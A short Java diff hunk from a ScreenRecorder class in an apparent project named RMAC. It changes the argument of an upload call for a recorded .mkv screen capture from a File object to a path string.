@@ -54,7 +54,7 @@ public class ScreenRecorder implements Runnable {
 
         // Upload the file
         RMAC.uploader.uploadFile(
-            new File(Constants.CURRENT_LOCATION + "\\" + fileName + ".mkv"),
+            Constants.CURRENT_LOCATION + "\\" + fileName + ".mkv",
             ArchiveFileType.SCREEN);
       }
     } catch (InterruptedException | IOException e) {
